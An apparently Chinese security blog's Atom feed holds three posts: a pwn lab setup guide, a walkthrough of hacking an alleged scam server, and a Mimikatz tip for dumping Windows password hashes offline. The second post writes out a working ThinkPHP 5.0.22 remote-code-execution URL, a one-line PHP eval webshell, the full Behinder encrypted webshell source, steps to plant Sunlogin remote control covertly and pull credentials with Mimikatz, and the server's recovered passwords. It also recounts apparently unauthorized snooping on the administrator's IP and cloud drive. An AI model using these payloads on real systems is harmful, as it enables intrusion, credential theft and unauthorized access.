<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title> </title>
  
  <subtitle>&gt;fucklee&#39;s Blog&lt;-</subtitle>
  <link href="https://vxer-lee.github.io/atom.xml" rel="self"/>
  
  <link href="https://vxer-lee.github.io/"/>
  <updated>2021-07-05T06:04:54.561Z</updated>
  <id>https://vxer-lee.github.io/</id>
  
  <author>
    <name>fucklee</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pwn学习入门笔记：（一）环境搭建</title>
    <link href="https://vxer-lee.github.io/2021/07/04/Pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%EF%BC%9A%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://vxer-lee.github.io/2021/07/04/Pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%EF%BC%9A%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</id>
    <published>2021-07-04T15:16:00.000Z</published>
    <updated>2021-07-05T06:04:54.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="macOS系统下搭建"><a href="#macOS系统下搭建" class="headerlink" title="macOS系统下搭建"></a>macOS系统下搭建</h2><p>我用的环境是macOS + docker+pwndocker，效果如下图。<br><img src="images/Pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%EF%BC%9A%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/2021-07-04-23-26-22.png">  </p><h3 id="1-Pwndocker安装命令"><a href="#1-Pwndocker安装命令" class="headerlink" title="1.Pwndocker安装命令"></a>1.Pwndocker安装命令</h3><p>首先需要安装docker，如何安装docker这里不再赘述。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">    --rm \</span><br><span class="line">    -h <span class="variable">$&#123;ctf_name&#125;</span> \</span><br><span class="line">    --name <span class="variable">$&#123;ctf_name&#125;</span> \</span><br><span class="line">    -v $(<span class="built_in">pwd</span>)/<span class="variable">$&#123;ctf_name&#125;</span>:/ctf/work \</span><br><span class="line">    -p 23946:23946 \</span><br><span class="line">    --cap-add=SYS_PTRACE \</span><br><span class="line">    skysider/pwndocker</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;ctf_name&#125;</span> /bin/bash</span><br></pre></td></tr></table></figure><h3 id="2-Pwndocker用pwngdb调试demo程序"><a href="#2-Pwndocker用pwngdb调试demo程序" class="headerlink" title="2.Pwndocker用pwngdb调试demo程序"></a>2.Pwndocker用pwngdb调试demo程序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#在你的macOS系统下的用户名目录会多出一个ctf_name目录，把需要调试的程序扔到这个目录，然后在Pwndocker下执行如下命令进行测试。</span></span><br><span class="line">gdb testGdb</span><br><span class="line">start</span><br><span class="line"><span class="comment">#效果如第一张图.</span></span><br></pre></td></tr></table></figure><h2 id="VMware虚拟机Ubuntu下搭建"><a href="#VMware虚拟机Ubuntu下搭建" class="headerlink" title="VMware虚拟机Ubuntu下搭建"></a>VMware虚拟机Ubuntu下搭建</h2><p>先上效果图，我Ubuntu下终端还没搞zsh所以看起来没有那么炫酷。</p><p><img src="images/Pwn%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0%EF%BC%9A%EF%BC%88%E4%B8%80%EF%BC%89%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20210705134441573.png" alt="image-20210705134441573">   </p><p>首先虚拟机VMware如何安装Ubuntu就不在赘诉，因为那实在是太简单了，相信大家都有这能力去解决。<br>我用的版本是： Ubuntu 18.04 64位。</p><h3 id="更换官方源"><a href="#更换官方源" class="headerlink" title="更换官方源"></a>更换官方源</h3><p>因为默认的官方源是国外的，所以更新起来会非常慢，除非你有软路由之类的可不需要更换官方的源。</p><p>建议更换 清华源更新，比较稳定。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//备份下源</span><br><span class="line">sudo  cp  /etc/apt/sources.list  /etc/apt/sources.list.bak</span><br><span class="line">//删除原来的，替换清华源</span><br><span class="line">sudo  nano  /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>sources.list文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#清华源</span></span><br><span class="line">deb  https://mirrors.tuna.tsinghua.edu.cn/ubuntu/  bionic  main  restricted  universe  multiverse</span><br><span class="line">deb  https://mirrors.tuna.tsinghua.edu.cn/ubuntu/  bionic-updates  main  restricted  universe  multiverse</span><br><span class="line">deb  https://mirrors.tuna.tsinghua.edu.cn/ubuntu/  bionic-backports  main  restricted  universe  multiverse</span><br><span class="line">deb  https://mirrors.tuna.tsinghua.edu.cn/ubuntu/  bionic-security  main  restricted  universe  multiverse</span><br><span class="line">deb  https://mirrors.tuna.tsinghua.edu.cn/ubuntu/  bionic-proposed  main  restricted  universe  multiverse</span><br><span class="line">deb-src  https://mirrors.tuna.tsinghua.edu.cn/ubuntu/  bionic  main  restricted  universe  multiverse</span><br><span class="line">deb-src  https://mirrors.tuna.tsinghua.edu.cn/ubuntu/  bionic-updates  main  restricted  universe  multiverse</span><br><span class="line">deb-src  https://mirrors.tuna.tsinghua.edu.cn/ubuntu/  bionic-backports  main  restricted  universe  multiverse</span><br><span class="line">deb-src  https://mirrors.tuna.tsinghua.edu.cn/ubuntu/  bionic-security  main  restricted  universe  multiverse</span><br><span class="line">deb-src  https://mirrors.tuna.tsinghua.edu.cn/ubuntu/  bionic-proposed  main  restricted  universe  multiverse</span><br></pre></td></tr></table></figure><h3 id="安装PwnDbg"><a href="#安装PwnDbg" class="headerlink" title="安装PwnDbg"></a>安装PwnDbg</h3><p>依赖：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo pip install --upgrade pip</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">sudo apt-get install git gdb gdb-multiarch</span><br><span class="line">sudo apt-get install <span class="string">&quot;binfmt*&quot;</span></span><br></pre></td></tr></table></figure><p>安装pwndbg：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure><h3 id="安装PwnTools"><a href="#安装PwnTools" class="headerlink" title="安装PwnTools"></a>安装PwnTools</h3><p>从pip安装pwntools</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install pwntools</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">sudo pip install pwntools</span><br></pre></td></tr></table></figure><p>安装qemu模拟器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user</span><br></pre></td></tr></table></figure><p>如果要在64位linux下运行32位程序，需要装multilib：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc-multilib</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;macOS系统下搭建&quot;&gt;&lt;a href=&quot;#macOS系统下搭建&quot; class=&quot;headerlink&quot; title=&quot;macOS系统下搭建&quot;&gt;&lt;/a&gt;macOS系统下搭建&lt;/h2&gt;&lt;p&gt;我用的环境是macOS + docker+pwndocker，效果如下图。&lt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>渗透之从ThinkPHP漏洞到向日葵远控拿下诈骗服务器</title>
    <link href="https://vxer-lee.github.io/2021/06/02/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/"/>
    <id>https://vxer-lee.github.io/2021/06/02/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/</id>
    <published>2021-06-02T11:21:00.000Z</published>
    <updated>2021-06-04T02:21:18.504Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><blockquote><p>任何渗透测试技术支持服务，都应该先拿到授权书后方可进行。</p></blockquote><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><p><a href="http://www.xxxx.cn/login">http://www.xxxx.cn/login</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">FrontFrame: Twitter Bootstrap,jQuery Sparklines,OWL Carousel,Font Awesome,JQuery:1.8.3,HTML5</span><br><span class="line">Widget: Access-Control</span><br><span class="line">Language: PHP&#x2F;7.1.13,PHP:7.1.13  (PHP框架)</span><br><span class="line">WebService: Nginx</span><br><span class="line">Other: Author:Mosaddek,Embed JSON</span><br><span class="line">xxx.xxx.xxx.xxx [香港 ThinkDream数据中心]</span><br><span class="line">域名注册商阿里巴巴云计算（北京）有限公司</span><br></pre></td></tr></table></figure><p>没识别到相关的CMS组件信息，我们进行手动操作，随便输入点什么让服务器报错回显有关信息。<br>比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.cn&#x2F;apip.php</span><br><span class="line">回显：</span><br><span class="line">熟悉的面孔，thinkphp</span><br><span class="line">ThinkPHP V5.0.22 &#123; 十年磨一剑-为API开发设计的高性能框架 &#125; （ThinkPHP 5.0.22）</span><br><span class="line">THINK_PATH D:\phpStudy\PHPTutorial\WWW\xxx\thinkphp\ （Windows 服务器，phpStudy）</span><br><span class="line">Apache&#x2F;2.4.23 (Win32) OpenSSL&#x2F;1.0.2j mod_fcgid&#x2F;2.3.9 （Apache）</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/1.png" alt="avatar"> </p><h2 id="0x02-漏洞测试"><a href="#0x02-漏洞测试" class="headerlink" title="0x02 漏洞测试"></a>0x02 漏洞测试</h2><p>知道了对方用的CMS和框架后，可以尝试用漏洞测试工具对其进行测试。<br>ThinkPHP漏洞取证小助手一顿撸!<br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/2.png" alt="avatar"><br>哦吼，返回404？？？？这是怎么回事呢？ 让我看看。<br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530145844566.png" alt="image-20210530145844566"><br>返回404说明主站的路径默认不在根目录，通过测试发现在public目录。<br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530150052092.png" alt="image-20210530150052092"><br>我去访问WebShell的时候，返回了奇怪的错误提示模块不存在public，我想这应该是我的Shell1.php写到了后端根目录，即<code>phpStudy\www\xxx\shell1.php</code>，而网站管理员设置了只能访问前端目录即<code>nginx\html\dist-xx\index.html</code>，所以访问时候就会报错显示404 无法访问。<br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530152150757.png" alt="image-20210530152150757"><br>（实验了下，确实前后端目录分离，在前端img目录下写入404.txt可正常访问到。）<br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210531180824901.png" alt="image-20210531180824901"><br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210531180846255.png" alt="image-20210531180846255"><br>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#管理员配置了我们只能访问public目录，那我们就用绝对路径的方式找到public目录，并且写入一句话。</span><br><span class="line">#由ThinkPHP报错得知，public绝对路径如下</span><br><span class="line">PUBLIC_PATH  D:\phpStudy\PHPTutorial\WWW\xx\public\</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530152452017.png" alt="image-20210530152452017"><br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530152606303.png" alt="image-20210530152606303"><br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530152647511.png" alt="image-20210530152647511"><br>写入phpinfo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xxx.com&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell1.php&amp;vars[1][]&#x3D;&lt;?phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>写入一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;iloveyou&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x03-一句话Shell"><a href="#0x03-一句话Shell" class="headerlink" title="0x03 一句话Shell"></a>0x03 一句话Shell</h2><p><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530152920940.png" alt="image-20210530152920940"></p><h2 id="0x04-冰蝎-内网渗透"><a href="#0x04-冰蝎-内网渗透" class="headerlink" title="0x04 冰蝎 内网渗透"></a>0x04 冰蝎 内网渗透</h2><p>冰蝎下载地址：<a href="https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11/Behinder_v3.0_Beta_11.t00ls.zip">https://github.com/rebeyond/Behinder/releases/download/Behinder_v3.0_Beta_11/Behinder_v3.0_Beta_11.t00ls.zip</a><br>冰蝎 一句话Shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">session_write_close();</span><br><span class="line"><span class="variable">$post</span>=file_get_contents(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$post</span>=openssl_decrypt(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$arr</span>=explode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @call_user_func(<span class="keyword">new</span> C(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行冰蝎</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar Behinder.jar</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530154310972.png" alt="image-20210530154310972"><br>服务器信息收集：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用来查看开了哪些进程，一般判断有哪些防火墙、杀毒软件</span></span><br><span class="line">tasklist /SVC</span><br></pre></td></tr></table></figure><p>将结果复制到这个网站中进行过滤<a href="https://maikefee.com/av_list">https://maikefee.com/av_list</a></p><h2 id="0x05-向日葵远控组合拳"><a href="#0x05-向日葵远控组合拳" class="headerlink" title="0x05 向日葵远控组合拳"></a>0x05 向日葵远控组合拳</h2><p>工具目录：</p><ul><li>sun.exe 向日葵</li><li>ggg.exe 绕过向日葵安装</li><li>new_mimi.exe 读取服务器密码</li><li>de_sun.exe 向日葵密码解密工具 (这个可以不用上传到远程服务器)<br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530165312741.png" alt="image-20210530165312741"> </li></ul><p>将文件上传到 <code>C:/xxx/xxx/</code>目录<br>然后分别运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/xxx/xxx/&gt; ggg.exe  <span class="comment">#让向日葵以绿色模式运行，无须安装</span></span><br><span class="line">C:/xxx/xxx/&gt; sun.exe  <span class="comment">#运行向日葵</span></span><br></pre></td></tr></table></figure><blockquote><p>重要！！！</p><p>向注册表中写入向日葵安装信息成功，运行向日葵后无须安装。</p></blockquote><p><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530165806676.png" alt="image-20210530165806676">  </p><blockquote><p>运行sun.exe 向日葵后，会在C:\ProgramData目录多出一个Oray目录（向日葵配置信息）。</p><p>下载向日葵配置文件C:/ProgramData/Oray/SunloginClient/config.ini<br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530170038380.png" alt="image-20210530170038380"><br>解析向日葵配置文件，提取验证码和密码</p><p>验证码：k7758258</p><p>密码（加密）：gxfhaBnFFlQ=<br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530170228194.png" alt="image-20210530170228194"><br>在本机运行de_sun.exe，解密向日葵密码<br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530170417329.png" alt="image-20210530170417329"><br>向日葵</p><p>伙伴识别码：7758258</p><p>验证码：Tlm3S0</p></blockquote><p><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530170552978.png" alt="image-20210530170552978"><br>成功连接上了远程服务器的向日葵，但是需要账号密码解锁！<br>上传组合拳里面的 new_mimi.exe 到远程服务器，运行如下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/xxx/xxx/ &gt;new_mimi.exe</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530170737867.png" alt="image-20210530170737867"><br>提取出账号密码</p><blockquote><p>远程服务器账号密码信息</p><p>Username : Administrator<br>Domain   :<br>Password : 12345678911</p></blockquote><h2 id="0x06-利用成功"><a href="#0x06-利用成功" class="headerlink" title="0x06 利用成功"></a>0x06 利用成功</h2><p><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530170923013.png" alt="image-20210530170923013"><br><img src="/images/%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BB%8EThinkPHP%E6%BC%8F%E6%B4%9E%E5%88%B0%E5%90%91%E6%97%A5%E8%91%B5%E8%BF%9C%E6%8E%A7/image-20210530171012224.png" alt="image-20210530171012224"><br>：）可以看到管理员在偷偷看注册的用户信息，我确认了服务器管理员不在操作，于是进行了进一步取证，得到了管理员的真实ip地址，上面还有一个百度网盘，里面有管理员的账号信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;任何渗透测试技术支持服务，都应该先拿到授权书后方可进行。&lt;/p&gt;
&lt;/bl</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Mimikatz离线破解Windows登陆密码</title>
    <link href="https://vxer-lee.github.io/2020/11/13/mimikatz%E7%A6%BB%E7%BA%BF%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/"/>
    <id>https://vxer-lee.github.io/2020/11/13/mimikatz%E7%A6%BB%E7%BA%BF%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/</id>
    <published>2020-11-13T03:50:11.000Z</published>
    <updated>2021-06-04T01:56:59.249Z</updated>
    
    <content type="html"><![CDATA[<h2 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h2><p>已获取system权限，无法在目标机器上上传Mimikatz(有杀软或者限制啥的)，这个时候可以通过reg命令导出SAM和SYSTEM文件，离线读取出NTML HASH，其实也可以用procdump64和mimikatz抓取Windows用户密码，这个小技巧算是另外一种方式吧</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>首先导出两个文件，可能需要管理员权限 ，CMD或者Powershell运行都可以。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure><p><img src="/images/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/1.png" alt="img"> </p><p>然后将这两个hive文件放到和Mimikatz同一个目录下，你可将目标机器的这两个文件拖出来到自己机器上尝试</p><p>mimikatz下载链接：<a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200809">https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200809</a></p><p><img src="/images/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/2.png" alt="img"> </p><p>运行mimikatz，输入命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::sam /sam:sam.hive /system:system.hive</span><br></pre></td></tr></table></figure><p><img src="/images/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/ntlm.png" alt="img"><br>获取NTML后，我们对其进行解密，就随便找个稍微好用的解密网站就行，这里用cmd5进行解密<br><img src="/images/mimikatz%E7%A0%B4%E8%A7%A3Windows%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/123456.png" alt="img"></p>]]></content>
    
    
      
      
